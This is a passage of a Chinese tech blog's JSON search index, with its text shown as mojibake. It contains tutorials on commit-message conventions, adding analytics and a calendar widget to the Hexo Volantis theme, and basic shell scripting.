çš„è®¿é—®é€Ÿåº¦ã€‚ jsDeliverï¼šhttps://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg raw.githubusercontentï¼šhttps://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"å¦‚ä½•å†™å¥½Commit log","slug":"how-to-write-a-commit-log","date":"2020-07-10T01:22:51.000Z","updated":"2021-06-16T13:37:17.307Z","comments":true,"path":"how-to-write-a-commit-log/","link":"","permalink":"https://www.0x2beace.com/how-to-write-a-commit-log/","excerpt":"","text":"å…¶å®å…³äºè¿™ä¸ªé—®é¢˜ï¼Œè€æ—©éƒ½æƒ³æ•´ç†äº†ï¼Œåªæ˜¯ä¸€ç›´æ²¡æœ‰è…¾å‡ºç©ºæ¥ï¼Œæœ€è¿‘åˆšå¥½æœ‰ç©ºï¼Œç´¢æ€§æ•´ç†äº†ä¸‹ã€‚ è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»ä»€ä¹ˆæ˜¯Gitäº†ï¼Œæœ¬æ–‡çš„é‡ç‚¹æ˜¯Commit Logï¼Œå¦‚æœè¿˜ä¸æ¸…æ¥šGitæ˜¯ä»€ä¹ˆï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘çš„Gitç³»åˆ—çš„å…¶ä»–ç¬”è®°ã€‚ ä¸ºä»€ä¹ˆè¦å…³æ³¨æäº¤ä¿¡æ¯ åŠ å¿«Reviewing Codeçš„è¿‡ç¨‹ æé†’è‡ªå·±æˆ–ä»–äººï¼ŒæŸä¸ªæäº¤å…·ä½“å¢åŠ äº†ä»€ä¹ˆåŠŸèƒ½ï¼Œæ”¹åŠ¨äº†å“ªäº›åœ°æ–¹ æé«˜é¡¹ç›®çš„æ•´ä½“è´¨é‡ Angular è§„èŒƒçš„ Commit message æ ¼å¼è¿™ç§æ ¼å¼ï¼ˆè§„èŒƒï¼‰æ˜¯æˆ‘ç›®å‰è§‰å¾—ç›¸å¯¹å…¶ä»–æ ¼å¼ï¼ˆè§„èŒƒï¼‰è€Œè¨€ï¼Œæœ€å®¹æ˜“æ¥å—ã€ä¸Šæ‰‹çš„ä¸€ç§ã€‚ å…¶æ ¸å¿ƒæ˜¯æ¯æ¬¡æäº¤ï¼ŒCommit message éƒ½åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼šHeaderï¼ŒBody å’Œ Footerã€‚ 12345&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&#x2F;&#x2F; ç©ºä¸€è¡Œ&lt;body&gt;&#x2F;&#x2F; ç©ºä¸€è¡Œ&lt;footer&gt; å…¶ä¸­ï¼ŒHeader æ˜¯å¿…éœ€çš„ï¼ŒBody å’Œ Footer å¯ä»¥çœç•¥ã€‚ HeaderHeader éƒ¨åˆ†åªæœ‰ä¸€è¡Œï¼ŒåŒ…æ‹¬ä¸‰ä¸ªå­—æ®µï¼štypeï¼ˆå¿…éœ€ï¼‰ã€scopeï¼ˆå¯é€‰ï¼‰å’Œ subjectï¼ˆå¿…éœ€ï¼‰ã€‚ type ç”¨äºè¯´æ˜ commit çš„ç±»åˆ«ï¼Œåªå…è®¸ä½¿ç”¨ä¸‹é¢ 7 ä¸ªæ ‡è¯†ã€‚ feat æ–°åŠŸèƒ½ï¼ˆfeatureï¼‰ fix ä¿®è¡¥ bug docs æ–‡æ¡£ï¼ˆdocumentationï¼‰ style æ ¼å¼ï¼ˆä¸å½±å“ä»£ç è¿è¡Œçš„å˜åŠ¨ï¼‰ refactor é‡æ„ï¼ˆå³ä¸æ˜¯æ–°å¢åŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹ bug çš„ä»£ç å˜åŠ¨ï¼‰ test å¢åŠ æµ‹è¯• chore æ„å»ºè¿‡ç¨‹ã€è¾…åŠ©å·¥å…·çš„å˜åŠ¨ perf æé«˜æ€§èƒ½ typo æ‰“å­—é”™è¯¯ scope ç”¨äºè¯´æ˜ commit å½±å“çš„èŒƒå›´ï¼Œæ¯”å¦‚æ•°æ®å±‚ã€æ§åˆ¶å±‚ã€è§†å›¾å±‚ç­‰ç­‰ï¼Œè§†é¡¹ç›®ä¸åŒè€Œä¸åŒã€‚ subject æ˜¯ commit ç›®çš„çš„ç®€çŸ­æè¿°ï¼Œä¸è¶…è¿‡ 50 ä¸ªå­—ç¬¦ã€‚ BodyBody éƒ¨åˆ†æ˜¯å¯¹æœ¬æ¬¡ commit çš„è¯¦ç»†æè¿°ï¼Œå¯ä»¥åˆ†æˆå¤šè¡Œã€‚ FooterFooter éƒ¨åˆ†åªç”¨äºä¸å…¼å®¹å˜åŠ¨å’Œå…³é—­ Issueã€‚ æ€»ç»“æœ¬æ¥æˆ‘è‡ªå·±ä¸€ç›´ä½¿ç”¨çš„æ–¹å¼å°±æ˜¯ï¼šgit commit -am &quot;fix login bug&quot;ï¼Œè™½ç„¶å¹¶æ²¡æœ‰ç»å¯¹çš„å¯¹é”™ï¼Œä½†è¿™æ˜¾ç„¶ä¸æ˜¯æœ€å¥½çš„æ–¹å¼ã€‚ è¿™ç§ä¸œè¥¿å¹¶æ²¡æœ‰å¼ºåˆ¶æ€§çš„è§„å®šï¼Œåªè¦å›¢é˜Ÿä¹‹é—´çº¦å®šå¥½ï¼Œç„¶åæŒ‰ç…§è¿™ä¸ªçº¦å®šåä½œå°±å¥½äº†ã€‚ æ‰€ä»¥æˆ‘è§‰å¾—åœ¨å›¢é˜Ÿä¹‹é—´commitæ—¶ï¼Œå¯ä»¥ä¸ç”¨å®Œå…¨æŒ‰ç…§Angular è§„èŒƒçš„Commit messageæ ¼å¼å»æäº¤ï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹çº¦å®šæ¥æ‰§è¡Œã€‚ commitæ—¶ï¼Œåªç”¨ä¿ç•™ Header éƒ¨åˆ†å°±å¥½ã€‚ pull requestæ—¶ï¼Œæ‰éœ€è¦ Headerã€Bodyã€Footer è¿™ä¸‰éƒ¨åˆ†ã€‚ å¦å¤–commitæ—¶éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š åˆ›å»ºçŸ­å°è€Œæ˜ç¡®çš„commitï¼Œä¸€å¥è¯è¯´æ¸…æ¥šã€‚ ä¸€ä¸ªå°æ”¹åŠ¨å¯¹åº”ä¸€æ¬¡commitï¼Œä¸å»ºè®®ä¸€å¤§å †æ”¹åŠ¨ï¼Œä¸€æ¬¡commitã€‚ å¦‚æœæ·»åŠ çš„ä»£ç ä¼šä½¿é¡¹ç›®å‘ç”Ÿæå¤§çš„å˜åŒ–ï¼Œé‚£ä¹ˆéœ€è¦åŠæ—¶æ›´æ–°remadeæ–‡ä»¶ä»¥å‘ä»–äººè¯´æ˜æ­¤æ¬¡æ›´æ”¹ã€‚ æœ€ä½³å®è·µ123docs: add FAQ in readme filefeat: increase user login functionfix: fix user login bug å‚è€ƒé“¾æ¥ Git å¦‚ä½•å†™å¥½ Commit Logï¼Ÿ","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Hexo Volantis ä¸»é¢˜ä¼˜åŒ– | å¢åŠ åˆ†æä¸ç»Ÿè®¡","slug":"hexo-volantis-theme-optimization-add-analysis-and-statistics","date":"2020-07-09T13:14:37.000Z","updated":"2020-07-09T13:19:08.344Z","comments":true,"path":"hexo-volantis-theme-optimization-add-analysis-and-statistics/","link":"","permalink":"https://www.0x2beace.com/hexo-volantis-theme-optimization-add-analysis-and-statistics/","excerpt":"Volantis é»˜è®¤æ”¯æŒ ä¸è’œå­ çš„è®¿é—®ç»Ÿè®¡ï¼Œå¯ä»¥è‡ªè¡Œæ·»åŠ ç™¾åº¦ç»Ÿè®¡å’Œ Google Analyticsã€‚","text":"Volantis é»˜è®¤æ”¯æŒ ä¸è’œå­ çš„è®¿é—®ç»Ÿè®¡ï¼Œå¯ä»¥è‡ªè¡Œæ·»åŠ ç™¾åº¦ç»Ÿè®¡å’Œ Google Analyticsã€‚ ç¯å¢ƒè¦æ±‚ Hexoï¼š4.2 Nodeï¼š12 Volantisï¼š2.6 åˆ†æä¸ç»Ÿè®¡å­—æ•°å’Œé˜…è¯»æ—¶é•¿ Volantis é»˜è®¤æ²¡æœ‰å®‰è£… wordcountæ’ä»¶ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å®‰è£…ï¼š 1npm i --save hexo-wordcount ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶themes/volantis/_config.ymlï¼Œå°† wordcount æ’ä»¶æ‰“å¼€ 12345plugins: ... # æ–‡ç« å­—æ•°ç»Ÿè®¡ã€é˜…è¯»æ—¶é•¿ï¼Œå¼€å¯éœ€è¦å®‰è£…æ’ä»¶: npm i --save hexo-wordcount wordcount: true ç»§ç»­ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶themes/volantis/_config.ymlï¼Œå°† wordcount æ”¾åœ¨éœ€è¦æ˜¾ç¤ºçš„ meta ä½ç½®ï¼š 12345678# å¸ƒå±€layout: on_list: meta: [..., wordcount, ...] on_page: meta: header: [..., wordcount, ...] footer: [..., wordcount, ...] ç™¾åº¦ç»Ÿè®¡ç™¾åº¦ç»Ÿè®¡æ˜¯ç™¾åº¦æ¨å‡ºçš„ä¸€æ¬¾å…è´¹çš„ä¸“ä¸šç½‘ç«™æµé‡åˆ†æå·¥å…·ï¼Œèƒ½å¤Ÿå‘Šè¯‰ç”¨æˆ·è®¿å®¢æ˜¯å¦‚ä½•æ‰¾åˆ°å¹¶æµè§ˆç”¨æˆ·çš„ç½‘ç«™ï¼Œåœ¨ç½‘ç«™ä¸Šåšäº†äº›ä»€ä¹ˆï¼Œéå¸¸æœ‰è¶£ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æŠŠç™¾åº¦ç»Ÿè®¡æ·»åŠ åˆ°è‡ªå·±åšå®¢å½“ä¸­ã€‚ è®¿é—®ç™¾åº¦ç»Ÿè®¡é¦–é¡µï¼Œæ³¨å†Œä¸€ä¸ªè´¦å·åç™»é™†ï¼Œæ·»åŠ ä½ çš„åšå®¢ç½‘ç«™ã€‚ ç‚¹å‡»è·å–ä»£ç ï¼Œå¤åˆ¶è¯¥ä»£ç ã€‚ åœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­ï¼Œå¢åŠ ä»¥ä¸‹å†…å®¹ï¼š 1cnzz: true ç”¨äºè®¾ç½®æ˜¯å¦å¼€å¯ç™¾åº¦ç»Ÿè®¡ã€‚ åœ¨themes/volantis/layout/_partialç›®å½•ä¸‹ï¼Œæ–°å»ºä¸€ä¸ªcnzz.ejsæ–‡ä»¶ï¼Œå°†åˆšæ‰å¤åˆ¶çš„å†…å®¹ç²˜è´´è¿›å»ï¼š 1234567891011&lt;% if (theme.cnzz)&#123; %&gt;&lt;script&gt; var _hmt &#x3D; _hmt || []; (function () &#123; var hm &#x3D; document.createElement(&quot;script&quot;); hm.src &#x3D; &quot;https:&#x2F;&#x2F;hm.baidu.com&#x2F;hm.js?xxxxxxxxxxxxxxxxxxxxxxx&quot;; var s &#x3D; document.getElementsByTagName(&quot;script&quot;)[0]; s.parentNode.insertBefore(hm, s); &#125;)();&lt;&#x2F;script&gt;&lt;% &#125; %&gt; æœ€åå°†ä»¥ä¸‹å†…å®¹æ”¾åœ¨ç½‘ç«™é¦–é¡µçš„å°¾éƒ¨themes/volantis/layout/_partial/footer.ejsä¸­ï¼š 1&lt;%- partial(&#39;cnzz&#39;) %&gt; å®Œæˆä»¥ä¸Šæ‰€æœ‰æ“ä½œä¹‹åï¼Œå¯ä»¥åœ¨ç™¾åº¦ç»Ÿè®¡ç®¡ç†é¡µé¢æ£€æŸ¥ä»£ç æ˜¯å¦å®‰è£…æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®å®‰è£…ï¼Œé€šå¸¸äºŒååˆ†é’Ÿä¹‹åå°±å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„åˆ†ææ•°æ®äº†ã€‚","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Hexo Volantis ä¸»é¢˜ä¼˜åŒ– | æ·»åŠ æ—¥å†å›¾","slug":"hexo-volantis-theme-optimization-add-calendar","date":"2020-07-09T13:07:08.000Z","updated":"2021-06-19T13:13:58.891Z","comments":true,"path":"hexo-volantis-theme-optimization-add-calendar/","link":"","permalink":"https://www.0x2beace.com/hexo-volantis-theme-optimization-add-calendar/","excerpt":"ä¸€ç›´è§‰å¾—GitHub æ—¥å†å›¾ï¼ˆä»£ç æäº¤ç»Ÿè®¡æ ·å¼ï¼‰å¾ˆå¥½çœ‹ï¼Œå¶ç„¶å‘ç°æ˜¯å¯ä»¥é€šè¿‡é…ç½®å°†æ—¥å†æ¨¡å—å¼•å…¥åˆ°Hexo çš„ä¸»é¢˜ä¸­çš„ã€‚ é»˜è®¤æ•ˆæœå¦‚ä¸‹ï¼š å› ä¸ºæˆ‘ä½¿ç”¨çš„Hexo ä¸»é¢˜æ˜¯Volantisã€è€Œè¯¥ä¸»é¢˜ç›®å‰å¹¶æ²¡æœ‰é›†æˆè¯¥æ§ä»¶ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨é…ç½®ã€‚","text":"ä¸€ç›´è§‰å¾—GitHub æ—¥å†å›¾ï¼ˆä»£ç æäº¤ç»Ÿè®¡æ ·å¼ï¼‰å¾ˆå¥½çœ‹ï¼Œå¶ç„¶å‘ç°æ˜¯å¯ä»¥é€šè¿‡é…ç½®å°†æ—¥å†æ¨¡å—å¼•å…¥åˆ°Hexo çš„ä¸»é¢˜ä¸­çš„ã€‚ é»˜è®¤æ•ˆæœå¦‚ä¸‹ï¼š å› ä¸ºæˆ‘ä½¿ç”¨çš„Hexo ä¸»é¢˜æ˜¯Volantisã€è€Œè¯¥ä¸»é¢˜ç›®å‰å¹¶æ²¡æœ‰é›†æˆè¯¥æ§ä»¶ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨é…ç½®ã€‚ ç¯å¢ƒè¦æ±‚ Hexoï¼š4.2 Nodeï¼š12 Volantisï¼š2.6 Volantis ä½ç‰ˆæœ¬å¯èƒ½ä¼šä¸é€‚ç”¨äºæœ¬æ–‡ä»‹ç»çš„æ–¹æ³•ï¼Œå¯ä»¥å‚è€ƒ YINUXY çš„ Hexoä¸»é¢˜ç¾åŒ– | ç»™ä½ çš„åšå®¢åŠ ä¸ŠGITHUBæ—¥å†äº‘å’Œåˆ†ç±» é…ç½® åœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ themes\\volantis\\_config.yml ä¸‹æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 1postCalendar: true ç”¨äºè®¾ç½®åœ¨å½’æ¡£é¡µé¢ä¸­æ˜¯å¦æ˜¾ç¤ºâ€™æ–‡ç« æ—¥å†â€™æ§ä»¶ï¼Œå¦‚æœä¸æƒ³æ˜¾ç¤ºï¼Œè®¾ç½®ä¸º false å³å¯ã€‚ åœ¨å½’æ¡£é¡µé¢ themes/volantis/layout/archive.ejs æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š 12345&lt;div id&#x3D;&quot;calendar&quot;&gt; &lt;% if (theme.postCalendar) &#123; %&gt; &lt;%- partial(&#39;_widget&#x2F;post-calendar&#39;) %&gt; &lt;% &#125; %&gt;&lt;&#x2F;div&gt; å…·ä½“æ·»åŠ ä½ç½®ï¼š è¿™é‡Œä¼šæ ¹æ®ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­çš„postCalendarçš„å€¼ï¼Œæ¥åˆ¤æ–­æ˜¯å¦éœ€è¦æ¸²æŸ“ã€‚ ç‚¹å‡»ä¸‹è½½æ—¥å†æ ·å¼æ–‡ä»¶ post-calendar.ejsï¼Œæ”¾ç½®äºthemes/volantis/layout/_widgetç›®å½•ä¸‹ã€‚ å°†å…¶ä¸­çš„ç¬¬ 16 è¡Œï¼Œæ›¿æ¢æˆä»¥ä¸‹å†…å®¹ï¼š 1&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN@1.0&#x2F;blog&#x2F;js&#x2F;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt; è‡³æ­¤å·²ç»å®Œæˆäº†ï¼Œä½¿ç”¨hexo generate &amp;&amp; hexo serveræŸ¥çœ‹æ˜¯å¦å¯ä»¥æ­£å¸¸åŠ è½½æ—¥å†å›¾ã€‚ é»˜è®¤çš„æ ·å¼æ˜¯é«˜ä»¿gitteeï¼Œå¦‚æœè§‰å¾—ä¸æ»¡æ„ï¼Œå¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£è‡ªå®šä¹‰ã€‚ å‚è€ƒé“¾æ¥ hexoï¼ˆsakuraï¼‰ä»¿giteeæ·»åŠ æ–‡ç« è´¡çŒ®åº¦æ—¥å†å›¾ï¼ˆechartsï¼‰","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"ç¼–å†™ç¬¬ä¸€ä¸ªShell è„šæœ¬","slug":"write-the-first-shell-script","date":"2020-07-08T13:56:46.000Z","updated":"2020-07-08T13:59:47.029Z","comments":true,"path":"write-the-first-shell-script/","link":"","permalink":"https://www.0x2beace.com/write-the-first-shell-script/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•ç¼–å†™ Shell è„šæœ¬è¿‡ç¨‹ä¸­çš„ä¸€äº›åŸºç¡€çŸ¥è¯†ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•ç¼–å†™ Shell è„šæœ¬è¿‡ç¨‹ä¸­çš„ä¸€äº›åŸºç¡€çŸ¥è¯†ã€‚ ä»€ä¹ˆæ˜¯ shell è„šæœ¬ Shell è„šæœ¬å°±æ˜¯å°†ä¸€å †çš„ Shell å‘½ä»¤ä»¥åŠæŒ‡å®šæ‰§è¡Œ Shell ï¼Œé€šè¿‡æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­æ¥æ‰§è¡Œã€‚ åˆ›å»ºç¬¬ä¸€ä¸ªshell è„šæœ¬ä¸‹é¢æˆ‘ä»¬æ¥åˆ›å»ºç¬¬ä¸€ä¸ª shell è„šæœ¬ï¼š 123456$ vim showdate#! &#x2F;bin&#x2F;bash# this script displays the date and who&#39;s logged ondatewho å¤§åŠŸå‘Šæˆï¼è¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªç®€å•çš„ shell è„šæœ¬çš„åˆ›å»ºï¼Œæ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼ä¸è¿‡æœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š shell è„šæœ¬çš„åç§°ä¸æ˜¯ä¸€å®šéœ€è¦ç”¨ .sh æ¥ç»“å°¾ï¼Œåªæ˜¯ç”¨ .sh ç»“å°¾ä¼šè®©å…¶ä»–äººä¸€ç›®äº†ç„¶çŸ¥é“è¿™æ˜¯ä¸€ä¸ª shell è„šæœ¬æ–‡ä»¶ã€‚ åœ¨åˆ›å»ºshell è„šæœ¬æ—¶ï¼Œå¿…é¡»åœ¨ç¬¬ä¸€è¡ŒæŒ‡å®šè¦ä½¿ç”¨çš„ shellï¼Œä¸”æ ¼å¼å›ºå®šä¸ºï¼š#!å¼€å¤´ã€‚ ç¬¬äºŒè¡Œçš„äº•å·ä½œä¸ºæ³¨é‡Šè¡Œã€‚ è¿è¡Œshell è„šæœ¬ï¼š 12345678$ lsshowdate$ .&#x2F;showdatebash: permission denied: .&#x2F;showdate$ sudo .&#x2F;showdatesudo: .&#x2F;showdate: command not found$ chmod u+x showdate$ .&#x2F;showdate åˆ›å»ºå®Œ shell è„šæœ¬ï¼Œæƒ³è¦è¿è¡Œï¼Œæœ‰ä¸¤ç§æ–¹æ¡ˆï¼š å°† shell è„šæœ¬æ‰€å¤„çš„ç›®å½•æ·»åŠ åˆ° PATH ç¯å¢ƒå˜é‡ä¸­; åœ¨æç¤ºç¬¦ä¸­ç”¨ç»å¯¹è·¯å¾„æˆ–è€…æ˜¯ç›¸å¯¹è·¯å¾„æ¥å¼•ç”¨ shell è„šæœ¬æ–‡ä»¶; åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œç”¨çš„æ˜¯ç»å¯¹è·¯å¾„çš„æ–¹å¼æ¥æ‰§è¡Œshell è„šæœ¬ï¼Œä½¿ç”¨å•ç‚¹æ“ä½œç¬¦è¡¨ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºæ–‡ä»¶å¤¹æƒé™çš„å…³ç³»ï¼Œè€Œä¸èƒ½ç›´æ¥ç”¨ sudo å‘½ä»¤å»æ‰§è¡Œï¼Œå› ä¸ºsudo å‘½ä»¤ä¼šæ£€æŸ¥showdate å¹¶ä¸åœ¨sudo å‘½ä»¤åˆ—è¡¨ä¸­ã€‚ æ‰€ä»¥æ­£è§£æ˜¯ï¼šä¿®æ”¹è¯¥æ–‡ä»¶çš„æ–‡ä»¶å¤¹æƒé™ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"å¯¹äºShellç¼–ç¨‹çš„ç†è§£","slug":"understanding-of-shell-programming","date":"2020-07-08T13:45:40.000Z","updated":"2020-07-08T13:55:36.897Z","comments":true,"path":"understanding-of-shell-programming/","link":"","permalink":"https://www.0x2beace.com/understanding-of-shell-programming/","excerpt":"åœ¨å¼€å§‹èŠShellç¼–ç¨‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è®¡ç®—æœºç¼–ç¨‹è¯­è¨€çš„éƒ½æœ‰å“ªäº›ç±»å‹ã€‚ è®¡ç®—æœºè¯­è¨€å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼š ä½çº§è¯­è¨€ é«˜çº§è¯­è¨€","text":"åœ¨å¼€å§‹èŠShellç¼–ç¨‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è®¡ç®—æœºç¼–ç¨‹è¯­è¨€çš„éƒ½æœ‰å“ªäº›ç±»å‹ã€‚ è®¡ç®—æœºè¯­è¨€å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼š ä½çº§è¯­è¨€ é«˜çº§è¯­è¨€ ä½çº§è¯­è¨€åŒ…æ‹¬ï¼šæœºå™¨è¯­è¨€å’Œæ±‡ç¼–è¯­è¨€ã€‚ é«˜çº§è¯­è¨€åŒ…æ‹¬ï¼šé™æ€è¯­è¨€å’ŒåŠ¨æ€è¯­è¨€ã€‚ è¿™é‡Œå°±ä¸å¯¹æœºå™¨è¯­è¨€å’Œæ±‡ç¼–è¯­è¨€åšä»‹ç»äº†ï¼Œä»Šå¤©çš„ä¸»è§’æ˜¯é«˜çº§è¯­è¨€ä¸‹çš„åŠ¨æ€è¯­è¨€ã€‚ åŠ¨æ€è¯­è¨€åŠ¨æ€è¯­è¨€åˆå«åšè„šæœ¬è¯­è¨€ã€‚ å®ƒå’Œä¼ ç»Ÿçš„é™æ€è¯­è¨€çš„åŒºåˆ«å°±åœ¨äº: 12å‰è€…çš„è¿è¡Œè¿‡ç¨‹ä¸ºï¼šç¼–å†™-&gt;è§£é‡Š-&gt;æ‰§è¡Œè€Œåè€…çš„è¿è¡Œè¿‡ç¨‹ä¸ºï¼šç¼–å†™-&gt;ç¼–è¯‘-&gt;é“¾æ¥-&gt;æ‰§è¡Œ è„šæœ¬è¯­è¨€çš„ä¼˜åŠ¿å°±åœ¨äº åªè¦æœ‰ä¸€ä¸ªå¯ä»¥å†™ä»£ç çš„ç¼–è¾‘å™¨å’Œèƒ½è§£é‡Šæ‰§è¡Œçš„è„šæœ¬è§£é‡Šå™¨å°±è¡Œäº†ã€‚ è¿™æ ·ä¸€æƒ³ï¼Œä¹Ÿå°±æ˜ç™½äº†ä¸ºä»€ä¹ˆæ­å»ºPythonçš„å¼€å‘ç¯å¢ƒè¿œæ¯”C#è¦å¿«ï¼Œå› ä¸ºå®ƒåªè¦å®‰è£…ä¸€ä¸ªè§£é‡Šå™¨å°±å¥½äº†ã€‚ åŠ¨æ€è¯­è¨€ä¸é™æ€è¯­è¨€å­˜åœ¨çš„äº‰è®®ä¹‹ä¸€ï¼š åœ¨é™æ€è¯­è¨€ä¸­ï¼Œå†™ä»£ç æ—¶å¿…é¡»çŸ¥é“æ¯ä¸ªå˜é‡çš„ç±»å‹; è€Œåœ¨åŠ¨æ€è¯­è¨€ä¸­ï¼Œéšä¾¿ä»€ä¹ˆæ—¶å€™ï¼Œä½ éƒ½å¯ä»¥æŠŠå˜é‡è®¾ä¸ºä»»æ„ç±»å‹çš„å€¼ã€‚ Shellç¼–ç¨‹æœ€åˆåœ¨å­¦ä¹ Shellè„šæœ¬æ—¶ï¼Œäº§ç”Ÿè¿‡è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼šä¸ºä»€ä¹ˆè¿˜èƒ½ç”¨PHPå†™Shellè„šæœ¬ï¼Ÿ å½“æ—¶å°±å¾ˆä¸ç†è§£ã€‚è¿™é‡Œå°±ååº”äº†ä¸¤ä¸ªé—®é¢˜ï¼š å¯¹PHPçš„ç†è§£ä¸æ·± å¯¹Shellè„šæœ¬çš„ç†è§£ä¸æ·± ç†è®ºä¸Šè®²ï¼Œåªè¦ä¸€é—¨è¯­è¨€æä¾›äº†è§£é‡Šå™¨ï¼Œè¿™é—¨è¯­è¨€å°±å¯ä»¥èƒœä»»è„šæœ¬ç¼–ç¨‹ã€‚ æ‰€ä»¥ç”¨ PHP å¯ä»¥å†™ Shell è„šæœ¬ï¼Œå°±æ²¡æœ‰ä»€ä¹ˆå¥½å¥‡æ€ªçš„äº†ã€‚ä½ å¯èƒ½ä¼šé—®ï¼šè¿™å¥è¯é‡Œé¢çš„ Shellæ€ä¹ˆç†è§£ï¼Ÿ è¿˜è®°å¾—å—ï¼ŒShellçš„æ¦‚å¿µæ˜¯ä»€ä¹ˆï¼Ÿ Shell è„šæœ¬å°±æ˜¯å°†ä¸€å †çš„ Shell å‘½ä»¤ä»¥åŠæŒ‡å®šæ‰§è¡Œ Shell ï¼Œé€šè¿‡æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­æ¥æ‰§è¡Œã€‚ è„šæœ¬è¯­è¨€çš„åˆ†ç±»è„šæœ¬è¯­è¨€åˆå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸¤å¤§ç±»ï¼š Shellè„šæœ¬ é€šç”¨åŠ¨æ€è¯­è¨€ å¸¸è§çš„Shellè„šæœ¬ï¼š sh bash csh ksh tcsh zsh AppleScript å¸¸è§çš„è„šæœ¬è¯­è¨€ JavaScript Perl PHP Python Ruby VBScript","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"å…³äºLinuxçš„Shellã€Shellè„šæœ¬ã€Shellç¯å¢ƒçš„ç†è§£","slug":"understanding-of-linux-shell-shell-script-shell-environment","date":"2020-07-08T13:40:01.000Z","updated":"2020-07-08T13:52:22.046Z","comments":true,"path":"understanding-of-linux-shell-shell-script-shell-environment/","link":"","permalink":"https://www.0x2beace.com/understanding-of-linux-shell-shell-script-shell-environment/","excerpt":"å¦‚æ ‡é¢˜æ‰€ç¤ºï¼Œè¿™ç‰‡ç¬”è®°ä¸»è¦ç›®çš„æ˜¯åŠ æ·±å¯¹Linuxçš„Shellã€Shellè„šæœ¬ã€Shellç¯å¢ƒçš„ç†è§£ã€‚","text":"å¦‚æ ‡é¢˜æ‰€ç¤ºï¼Œè¿™ç‰‡ç¬”è®°ä¸»è¦ç›®çš„æ˜¯åŠ 